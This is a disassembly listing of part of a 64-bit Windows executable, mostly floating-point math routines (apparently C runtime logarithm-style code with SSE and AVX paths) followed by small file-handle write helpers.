   14000b725:	0f 84 85 02 00 00    	je     0x14000b9b0
   14000b72b:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000b72f:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000b733:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000b737:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000b73b:	0f 86 2f 02 00 00    	jbe    0x14000b970
   14000b741:	66 0f db 15 57 75 00 	pand   0x7557(%rip),%xmm2        # 0x140012ca0
   14000b748:	00 
   14000b749:	f2 0f 5c 25 df 75 00 	subsd  0x75df(%rip),%xmm4        # 0x140012d30
   14000b750:	00 
   14000b751:	66 0f 2f 35 67 76 00 	comisd 0x7667(%rip),%xmm6        # 0x140012dc0
   14000b758:	00 
   14000b759:	0f 84 d8 01 00 00    	je     0x14000b937
   14000b75f:	66 0f 54 25 b9 76 00 	andpd  0x76b9(%rip),%xmm4        # 0x140012e20
   14000b766:	00 
   14000b767:	4c 8b c8             	mov    %rax,%r9
   14000b76a:	48 23 05 3f 75 00 00 	and    0x753f(%rip),%rax        # 0x140012cb0
   14000b771:	4c 23 0d 48 75 00 00 	and    0x7548(%rip),%r9        # 0x140012cc0
   14000b778:	49 d1 e1             	shl    $1,%r9
   14000b77b:	49 03 c1             	add    %r9,%rax
   14000b77e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000b783:	66 0f 2f 25 55 76 00 	comisd 0x7655(%rip),%xmm4        # 0x140012de0
   14000b78a:	00 
   14000b78b:	0f 82 df 00 00 00    	jb     0x14000b870
   14000b791:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000b795:	66 0f eb 15 a3 75 00 	por    0x75a3(%rip),%xmm2        # 0x140012d40
   14000b79c:	00 
   14000b79d:	66 0f eb 0d 9b 75 00 	por    0x759b(%rip),%xmm1        # 0x140012d40
   14000b7a4:	00 
   14000b7a5:	4c 8d 0d 14 87 00 00 	lea    0x8714(%rip),%r9        # 0x140013ec0
   14000b7ac:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000b7b0:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000b7b6:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000b7ba:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000b7be:	4c 8d 0d db 76 00 00 	lea    0x76db(%rip),%r9        # 0x140012ea0
   14000b7c5:	f2 0f 10 1d e3 75 00 	movsd  0x75e3(%rip),%xmm3        # 0x140012db0
   14000b7cc:	00 
   14000b7cd:	f2 0f 10 0d ab 75 00 	movsd  0x75ab(%rip),%xmm1        # 0x140012d80
   14000b7d4:	00 
   14000b7d5:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000b7d9:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000b7dd:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000b7e1:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000b7e5:	f2 0f 58 1d b3 75 00 	addsd  0x75b3(%rip),%xmm3        # 0x140012da0
   14000b7ec:	00 
   14000b7ed:	f2 0f 58 0d 7b 75 00 	addsd  0x757b(%rip),%xmm1        # 0x140012d70
   14000b7f4:	00 
   14000b7f5:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000b7f9:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000b7fd:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000b801:	f2 0f 58 1d 87 75 00 	addsd  0x7587(%rip),%xmm3        # 0x140012d90
   14000b808:	00 
   14000b809:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000b80d:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000b811:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000b815:	f2 0f 10 2d f3 74 00 	movsd  0x74f3(%rip),%xmm5        # 0x140012d10
   14000b81c:	00 
   14000b81d:	f2 0f 59 0d ab 74 00 	mulsd  0x74ab(%rip),%xmm1        # 0x140012cd0
   14000b824:	00 
   14000b825:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000b829:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000b82d:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000b833:	48 8d 15 76 7e 00 00 	lea    0x7e76(%rip),%rdx        # 0x1400136b0
   14000b83a:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000b83f:	f2 0f 10 25 b9 74 00 	movsd  0x74b9(%rip),%xmm4        # 0x140012d00
   14000b846:	00 
   14000b847:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000b84b:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000b84f:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000b853:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000b857:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000b85d:	48 83 c4 58          	add    $0x58,%rsp
   14000b861:	c3                   	ret
   14000b862:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000b869:	1f 84 00 00 00 00 00 
   14000b870:	f2 0f 10 15 a8 74 00 	movsd  0x74a8(%rip),%xmm2        # 0x140012d20
   14000b877:	00 
   14000b878:	f2 0f 5c 05 b0 74 00 	subsd  0x74b0(%rip),%xmm0        # 0x140012d30
   14000b87f:	00 
   14000b880:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000b884:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000b888:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000b88c:	f2 0f 10 25 ac 75 00 	movsd  0x75ac(%rip),%xmm4        # 0x140012e40
   14000b893:	00 
   14000b894:	f2 0f 10 2d c4 75 00 	movsd  0x75c4(%rip),%xmm5        # 0x140012e60
   14000b89b:	00 
   14000b89c:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000b8a0:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000b8a4:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000b8a8:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000b8ac:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000b8b0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000b8b4:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000b8b8:	f2 0f 58 25 70 75 00 	addsd  0x7570(%rip),%xmm4        # 0x140012e30
   14000b8bf:	00 
   14000b8c0:	f2 0f 58 2d 88 75 00 	addsd  0x7588(%rip),%xmm5        # 0x140012e50
   14000b8c7:	00 
   14000b8c8:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000b8cc:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000b8d0:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000b8d4:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000b8d8:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000b8dc:	f2 0f 10 15 0c 74 00 	movsd  0x740c(%rip),%xmm2        # 0x140012cf0
   14000b8e3:	00 
   14000b8e4:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000b8e8:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000b8ec:	f2 0f 10 35 ec 73 00 	movsd  0x73ec(%rip),%xmm6        # 0x140012ce0
   14000b8f3:	00 
   14000b8f4:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000b8f8:	66 0f db 1d 70 75 00 	pand   0x7570(%rip),%xmm3        # 0x140012e70
   14000b8ff:	00 
   14000b900:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000b904:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000b908:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000b90c:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000b910:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000b914:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000b918:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000b91c:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000b920:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000b924:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000b928:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000b92c:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000b932:	48 83 c4 58          	add    $0x58,%rsp
   14000b936:	c3                   	ret
   14000b937:	66 0f eb 15 f1 73 00 	por    0x73f1(%rip),%xmm2        # 0x140012d30
   14000b93e:	00 
   14000b93f:	f2 0f 5c 15 e9 73 00 	subsd  0x73e9(%rip),%xmm2        # 0x140012d30
   14000b946:	00 
   14000b947:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000b94b:	66 0f db 15 4d 73 00 	pand   0x734d(%rip),%xmm2        # 0x140012ca0
   14000b952:	00 
   14000b953:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000b958:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000b95d:	66 0f fa 2d 6b 74 00 	psubd  0x746b(%rip),%xmm5        # 0x140012dd0
   14000b964:	00 
   14000b965:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000b969:	e9 f1 fd ff ff       	jmp    0x14000b75f
   14000b96e:	66 90                	xchg   %ax,%ax
   14000b970:	75 1e                	jne    0x14000b990
   14000b972:	f2 0f 10 0d c6 72 00 	movsd  0x72c6(%rip),%xmm1        # 0x140012c40
   14000b979:	00 
   14000b97a:	44 8b 05 ff 74 00 00 	mov    0x74ff(%rip),%r8d        # 0x140012e80
   14000b981:	e8 ea 08 00 00       	call   0x14000c270
   14000b986:	eb 48                	jmp    0x14000b9d0
   14000b988:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000b98f:	00 
   14000b990:	f2 0f 10 0d c8 72 00 	movsd  0x72c8(%rip),%xmm1        # 0x140012c60
   14000b997:	00 
   14000b998:	44 8b 05 e5 74 00 00 	mov    0x74e5(%rip),%r8d        # 0x140012e84
   14000b99f:	e8 cc 08 00 00       	call   0x14000c270
   14000b9a4:	eb 2a                	jmp    0x14000b9d0
   14000b9a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000b9ad:	00 00 00 
   14000b9b0:	48 3b 05 99 72 00 00 	cmp    0x7299(%rip),%rax        # 0x140012c50
   14000b9b7:	74 17                	je     0x14000b9d0
   14000b9b9:	48 3b 05 80 72 00 00 	cmp    0x7280(%rip),%rax        # 0x140012c40
   14000b9c0:	74 ce                	je     0x14000b990
   14000b9c2:	48 0b 05 a7 72 00 00 	or     0x72a7(%rip),%rax        # 0x140012c70
   14000b9c9:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000b9ce:	66 90                	xchg   %ax,%ax
   14000b9d0:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000b9d6:	48 83 c4 58          	add    $0x58,%rsp
   14000b9da:	c3                   	ret
   14000b9db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000b9e0:	48 33 c0             	xor    %rax,%rax
   14000b9e3:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000b9e8:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000b9ed:	c5 e1 fb 1d 8b 72 00 	vpsubq 0x728b(%rip),%xmm3,%xmm3        # 0x140012c80
   14000b9f4:	00 
   14000b9f5:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000b9f9:	c5 f9 db 2d 4f 72 00 	vpand  0x724f(%rip),%xmm0,%xmm5        # 0x140012c50
   14000ba00:	00 
   14000ba01:	c5 f9 2f 2d 47 72 00 	vcomisd 0x7247(%rip),%xmm5        # 0x140012c50
   14000ba08:	00 
   14000ba09:	0f 84 41 02 00 00    	je     0x14000bc50
   14000ba0f:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000ba13:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000ba17:	0f 86 e3 01 00 00    	jbe    0x14000bc00
   14000ba1d:	c5 f9 db 15 7b 72 00 	vpand  0x727b(%rip),%xmm0,%xmm2        # 0x140012ca0
   14000ba24:	00 
   14000ba25:	c5 fb 5c 25 03 73 00 	vsubsd 0x7303(%rip),%xmm0,%xmm4        # 0x140012d30
   14000ba2c:	00 
   14000ba2d:	c5 f9 2f 35 8b 73 00 	vcomisd 0x738b(%rip),%xmm6        # 0x140012dc0
   14000ba34:	00 
   14000ba35:	0f 84 8e 01 00 00    	je     0x14000bbc9
   14000ba3b:	c5 f9 db 0d 6d 72 00 	vpand  0x726d(%rip),%xmm0,%xmm1        # 0x140012cb0
   14000ba42:	00 
   14000ba43:	c5 f9 db 1d 75 72 00 	vpand  0x7275(%rip),%xmm0,%xmm3        # 0x140012cc0
   14000ba4a:	00 
   14000ba4b:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000ba50:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000ba54:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000ba59:	c5 d9 db 25 bf 73 00 	vpand  0x73bf(%rip),%xmm4,%xmm4        # 0x140012e20
   14000ba60:	00 
   14000ba61:	c5 f9 2f 25 77 73 00 	vcomisd 0x7377(%rip),%xmm4        # 0x140012de0
   14000ba68:	00 
   14000ba69:	0f 82 b1 00 00 00    	jb     0x14000bb20
   14000ba6f:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000ba73:	c5 e9 eb 15 c5 72 00 	vpor   0x72c5(%rip),%xmm2,%xmm2        # 0x140012d40
   14000ba7a:	00 
   14000ba7b:	c5 f1 eb 0d bd 72 00 	vpor   0x72bd(%rip),%xmm1,%xmm1        # 0x140012d40
   14000ba82:	00 
   14000ba83:	4c 8d 0d 36 84 00 00 	lea    0x8436(%rip),%r9        # 0x140013ec0
   14000ba8a:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000ba8e:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000ba94:	4c 8d 0d 05 74 00 00 	lea    0x7405(%rip),%r9        # 0x140012ea0
   14000ba9b:	c5 f3 59 c1          	vmulsd %xmm1,%xmm1,%xmm0
   14000ba9f:	c5 fb 10 1d 09 73 00 	vmovsd 0x7309(%rip),%xmm3        # 0x140012db0
   14000baa6:	00 
   14000baa7:	c5 fb 10 2d d1 72 00 	vmovsd 0x72d1(%rip),%xmm5        # 0x140012d80
   14000baae:	00 
   14000baaf:	c4 e2 f1 a9 1d e8 72 	vfmadd213sd 0x72e8(%rip),%xmm1,%xmm3        # 0x140012da0
   14000bab6:	00 00 
   14000bab8:	c4 e2 f1 a9 2d 7f 72 	vfmadd213sd 0x727f(%rip),%xmm1,%xmm5        # 0x140012d40
   14000babf:	00 00 
   14000bac1:	f2 0f 10 e0          	movsd  %xmm0,%xmm4
   14000bac5:	c4 e2 f1 a9 1d c2 72 	vfmadd213sd 0x72c2(%rip),%xmm1,%xmm3        # 0x140012d90
   14000bacc:	00 00 
   14000bace:	c5 fb 59 e0          	vmulsd %xmm0,%xmm0,%xmm4
   14000bad2:	c4 e2 d1 b9 c8       	vfmadd231sd %xmm0,%xmm5,%xmm1
   14000bad7:	c4 e2 e1 b9 cc       	vfmadd231sd %xmm4,%xmm3,%xmm1
   14000badc:	c5 f3 59 0d ec 71 00 	vmulsd 0x71ec(%rip),%xmm1,%xmm1        # 0x140012cd0
   14000bae3:	00 
   14000bae4:	c5 fb 10 2d 24 72 00 	vmovsd 0x7224(%rip),%xmm5        # 0x140012d10
   14000baeb:	00 
   14000baec:	c4 e2 c9 ab e9       	vfmsub213sd %xmm1,%xmm6,%xmm5
   14000baf1:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000baf7:	48 8d 15 b2 7b 00 00 	lea    0x7bb2(%rip),%rdx        # 0x1400136b0
   14000bafe:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000bb03:	c5 eb 58 d5          	vaddsd %xmm5,%xmm2,%xmm2
   14000bb07:	c4 e2 c9 b9 05 f0 71 	vfmadd231sd 0x71f0(%rip),%xmm6,%xmm0        # 0x140012d00
   14000bb0e:	00 00 
   14000bb10:	c5 fb 58 c2          	vaddsd %xmm2,%xmm0,%xmm0
   14000bb14:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bb1a:	48 83 c4 58          	add    $0x58,%rsp
   14000bb1e:	c3                   	ret
   14000bb1f:	90                   	nop
   14000bb20:	c5 fb 10 15 f8 71 00 	vmovsd 0x71f8(%rip),%xmm2        # 0x140012d20
   14000bb27:	00 
   14000bb28:	c5 fb 5c 05 00 72 00 	vsubsd 0x7200(%rip),%xmm0,%xmm0        # 0x140012d30
   14000bb2f:	00 
   14000bb30:	c5 eb 58 d0          	vaddsd %xmm0,%xmm2,%xmm2
   14000bb34:	c5 fb 5e ca          	vdivsd %xmm2,%xmm0,%xmm1
   14000bb38:	c5 fb 10 25 00 73 00 	vmovsd 0x7300(%rip),%xmm4        # 0x140012e40
   14000bb3f:	00 
   14000bb40:	c5 fb 10 2d 18 73 00 	vmovsd 0x7318(%rip),%xmm5        # 0x140012e60
   14000bb47:	00 
   14000bb48:	c5 fb 59 f1          	vmulsd %xmm1,%xmm0,%xmm6
   14000bb4c:	c5 f3 58 c9          	vaddsd %xmm1,%xmm1,%xmm1
   14000bb50:	c5 f3 59 d1          	vmulsd %xmm1,%xmm1,%xmm2
   14000bb54:	c4 e2 e9 a9 25 d3 72 	vfmadd213sd 0x72d3(%rip),%xmm2,%xmm4        # 0x140012e30
   14000bb5b:	00 00 
   14000bb5d:	c4 e2 e9 a9 2d ea 72 	vfmadd213sd 0x72ea(%rip),%xmm2,%xmm5        # 0x140012e50
   14000bb64:	00 00 
   14000bb66:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000bb6a:	c5 db 59 e2          	vmulsd %xmm2,%xmm4,%xmm4
   14000bb6e:	c5 eb 59 d2          	vmulsd %xmm2,%xmm2,%xmm2
   14000bb72:	c5 eb 59 d1          	vmulsd %xmm1,%xmm2,%xmm2
   14000bb76:	c5 d3 59 ea          	vmulsd %xmm2,%xmm5,%xmm5
   14000bb7a:	c5 db 58 e5          	vaddsd %xmm5,%xmm4,%xmm4
   14000bb7e:	c5 db 5c e6          	vsubsd %xmm6,%xmm4,%xmm4
   14000bb82:	c5 f9 db 1d e6 72 00 	vpand  0x72e6(%rip),%xmm0,%xmm3        # 0x140012e70
   14000bb89:	00 
   14000bb8a:	c5 fb 5c c3          	vsubsd %xmm3,%xmm0,%xmm0
   14000bb8e:	c5 db 58 e0          	vaddsd %xmm0,%xmm4,%xmm4
   14000bb92:	c5 db 59 0d 46 71 00 	vmulsd 0x7146(%rip),%xmm4,%xmm1        # 0x140012ce0
   14000bb99:	00 
   14000bb9a:	c5 db 59 25 4e 71 00 	vmulsd 0x714e(%rip),%xmm4,%xmm4        # 0x140012cf0
   14000bba1:	00 
   14000bba2:	c5 e3 59 05 46 71 00 	vmulsd 0x7146(%rip),%xmm3,%xmm0        # 0x140012cf0
   14000bba9:	00 
   14000bbaa:	c5 e3 59 1d 2e 71 00 	vmulsd 0x712e(%rip),%xmm3,%xmm3        # 0x140012ce0
   14000bbb1:	00 
   14000bbb2:	c5 fb 58 c4          	vaddsd %xmm4,%xmm0,%xmm0
   14000bbb6:	c5 fb 58 c1          	vaddsd %xmm1,%xmm0,%xmm0
   14000bbba:	c5 fb 58 c3          	vaddsd %xmm3,%xmm0,%xmm0
   14000bbbe:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bbc4:	48 83 c4 58          	add    $0x58,%rsp
   14000bbc8:	c3                   	ret
   14000bbc9:	c5 e9 eb 15 5f 71 00 	vpor   0x715f(%rip),%xmm2,%xmm2        # 0x140012d30
   14000bbd0:	00 
   14000bbd1:	c5 eb 5c 15 57 71 00 	vsubsd 0x7157(%rip),%xmm2,%xmm2        # 0x140012d30
   14000bbd8:	00 
   14000bbd9:	c5 d1 73 d2 34       	vpsrlq $0x34,%xmm2,%xmm5
   14000bbde:	c5 e9 db 15 ba 70 00 	vpand  0x70ba(%rip),%xmm2,%xmm2        # 0x140012ca0
   14000bbe5:	00 
   14000bbe6:	c5 f9 28 c2          	vmovapd %xmm2,%xmm0
   14000bbea:	c5 d1 fa 2d de 71 00 	vpsubd 0x71de(%rip),%xmm5,%xmm5        # 0x140012dd0
   14000bbf1:	00 
   14000bbf2:	c5 fa e6 f5          	vcvtdq2pd %xmm5,%xmm6
   14000bbf6:	e9 40 fe ff ff       	jmp    0x14000ba3b
   14000bbfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000bc00:	75 2e                	jne    0x14000bc30
   14000bc02:	c5 fb 10 0d 36 70 00 	vmovsd 0x7036(%rip),%xmm1        # 0x140012c40
   14000bc09:	00 
   14000bc0a:	44 8b 05 6f 72 00 00 	mov    0x726f(%rip),%r8d        # 0x140012e80
   14000bc11:	e8 5a 06 00 00       	call   0x14000c270
   14000bc16:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bc1c:	48 83 c4 58          	add    $0x58,%rsp
   14000bc20:	c3                   	ret
   14000bc21:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000bc28:	0f 1f 84 00 00 00 00 
   14000bc2f:	00 
   14000bc30:	c5 fb 10 0d 28 70 00 	vmovsd 0x7028(%rip),%xmm1        # 0x140012c60
   14000bc37:	00 
   14000bc38:	44 8b 05 45 72 00 00 	mov    0x7245(%rip),%r8d        # 0x140012e84
   14000bc3f:	e8 2c 06 00 00       	call   0x14000c270
   14000bc44:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bc4a:	48 83 c4 58          	add    $0x58,%rsp
   14000bc4e:	c3                   	ret
   14000bc4f:	90                   	nop
   14000bc50:	48 3b 05 f9 6f 00 00 	cmp    0x6ff9(%rip),%rax        # 0x140012c50
   14000bc57:	74 27                	je     0x14000bc80
   14000bc59:	48 3b 05 e0 6f 00 00 	cmp    0x6fe0(%rip),%rax        # 0x140012c40
   14000bc60:	74 ce                	je     0x14000bc30
   14000bc62:	48 0b 05 07 70 00 00 	or     0x7007(%rip),%rax        # 0x140012c70
   14000bc69:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000bc6e:	44 8b 05 13 72 00 00 	mov    0x7213(%rip),%r8d        # 0x140012e88
   14000bc75:	e8 f6 05 00 00       	call   0x14000c270
   14000bc7a:	eb 04                	jmp    0x14000bc80
   14000bc7c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000bc80:	c5 f9 6f 74 24 20    	vmovdqa 0x20(%rsp),%xmm6
   14000bc86:	48 83 c4 58          	add    $0x58,%rsp
   14000bc8a:	c3                   	ret
   14000bc8b:	cc                   	int3
   14000bc8c:	40 53                	rex push %rbx
   14000bc8e:	48 83 ec 40          	sub    $0x40,%rsp
   14000bc92:	48 8b 05 37 bd 00 00 	mov    0xbd37(%rip),%rax        # 0x1400179d0
   14000bc99:	33 db                	xor    %ebx,%ebx
   14000bc9b:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000bc9f:	75 2e                	jne    0x14000bccf
   14000bca1:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000bca6:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000bcaa:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000bcae:	48 8d 0d db 71 00 00 	lea    0x71db(%rip),%rcx        # 0x140012e90
   14000bcb5:	45 33 c9             	xor    %r9d,%r9d
   14000bcb8:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000bcbd:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000bcc2:	ff 15 98 13 00 00    	call   *0x1398(%rip)        # 0x14000d060
   14000bcc8:	48 89 05 01 bd 00 00 	mov    %rax,0xbd01(%rip)        # 0x1400179d0
   14000bccf:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000bcd3:	0f 95 c3             	setne  %bl
   14000bcd6:	8b c3                	mov    %ebx,%eax
   14000bcd8:	48 83 c4 40          	add    $0x40,%rsp
   14000bcdc:	5b                   	pop    %rbx
   14000bcdd:	c3                   	ret
   14000bcde:	cc                   	int3
   14000bcdf:	cc                   	int3
   14000bce0:	48 83 ec 28          	sub    $0x28,%rsp
   14000bce4:	48 8b 0d e5 bc 00 00 	mov    0xbce5(%rip),%rcx        # 0x1400179d0
   14000bceb:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000bcef:	77 06                	ja     0x14000bcf7
   14000bcf1:	ff 15 31 13 00 00    	call   *0x1331(%rip)        # 0x14000d028
   14000bcf7:	48 83 c4 28          	add    $0x28,%rsp
   14000bcfb:	c3                   	ret
   14000bcfc:	48 8b c4             	mov    %rsp,%rax
   14000bcff:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000bd03:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000bd07:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000bd0b:	57                   	push   %rdi
   14000bd0c:	48 83 ec 40          	sub    $0x40,%rsp
   14000bd10:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000bd15:	49 8b f8             	mov    %r8,%rdi
   14000bd18:	4d 8b c8             	mov    %r8,%r9
   14000bd1b:	8b f2                	mov    %edx,%esi
   14000bd1d:	44 8b c2             	mov    %edx,%r8d
   14000bd20:	48 8b e9             	mov    %rcx,%rbp
   14000bd23:	48 8b d1             	mov    %rcx,%rdx
   14000bd26:	48 8b 0d a3 bc 00 00 	mov    0xbca3(%rip),%rcx        # 0x1400179d0
   14000bd2d:	ff 15 25 13 00 00    	call   *0x1325(%rip)        # 0x14000d058
   14000bd33:	8b d8                	mov    %eax,%ebx
   14000bd35:	85 c0                	test   %eax,%eax
   14000bd37:	75 6a                	jne    0x14000bda3
   14000bd39:	ff 15 d9 12 00 00    	call   *0x12d9(%rip)        # 0x14000d018
   14000bd3f:	83 f8 06             	cmp    $0x6,%eax
   14000bd42:	75 5f                	jne    0x14000bda3
   14000bd44:	48 8b 0d 85 bc 00 00 	mov    0xbc85(%rip),%rcx        # 0x1400179d0
   14000bd4b:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000bd4f:	77 06                	ja     0x14000bd57
   14000bd51:	ff 15 d1 12 00 00    	call   *0x12d1(%rip)        # 0x14000d028
   14000bd57:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bd5d:	48 8d 0d 2c 71 00 00 	lea    0x712c(%rip),%rcx        # 0x140012e90
   14000bd64:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000bd69:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000bd6f:	45 33 c9             	xor    %r9d,%r9d
   14000bd72:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000bd77:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000bd7c:	ff 15 de 12 00 00    	call   *0x12de(%rip)        # 0x14000d060
   14000bd82:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000bd88:	4c 8b cf             	mov    %rdi,%r9
   14000bd8b:	48 8b c8             	mov    %rax,%rcx
   14000bd8e:	48 89 05 3b bc 00 00 	mov    %rax,0xbc3b(%rip)        # 0x1400179d0
   14000bd95:	44 8b c6             	mov    %esi,%r8d
   14000bd98:	48 8b d5             	mov    %rbp,%rdx
   14000bd9b:	ff 15 b7 12 00 00    	call   *0x12b7(%rip)        # 0x14000d058
   14000bda1:	8b d8                	mov    %eax,%ebx
   14000bda3:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000bda8:	8b c3                	mov    %ebx,%eax
   14000bdaa:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000bdaf:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000bdb4:	48 83 c4 40          	add    $0x40,%rsp
   14000bdb8:	5f                   	pop    %rdi
   14000bdb9:	c3                   	ret
   14000bdba:	cc                   	int3
   14000bdbb:	cc                   	int3
   14000bdbc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bdc1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000bdc6:	57                   	push   %rdi
   14000bdc7:	48 83 ec 20          	sub    $0x20,%rsp
   14000bdcb:	49 8b f9             	mov    %r9,%rdi
   14000bdce:	49 8b d8             	mov    %r8,%rbx
   14000bdd1:	8b 0a                	mov    (%rdx),%ecx
   14000bdd3:	e8 d0 be ff ff       	call   0x140007ca8
   14000bdd8:	90                   	nop
   14000bdd9:	48 8b 03             	mov    (%rbx),%rax
   14000bddc:	48 63 08             	movslq (%rax),%rcx
   14000bddf:	48 8b d1             	mov    %rcx,%rdx
   14000bde2:	48 8b c1             	mov    %rcx,%rax
   14000bde5:	48 c1 f8 06          	sar    $0x6,%rax
   14000bde9:	4c 8d 05 e0 c9 00 00 	lea    0xc9e0(%rip),%r8        # 0x1400187d0
   14000bdf0:	83 e2 3f             	and    $0x3f,%edx
   14000bdf3:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000bdf7:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
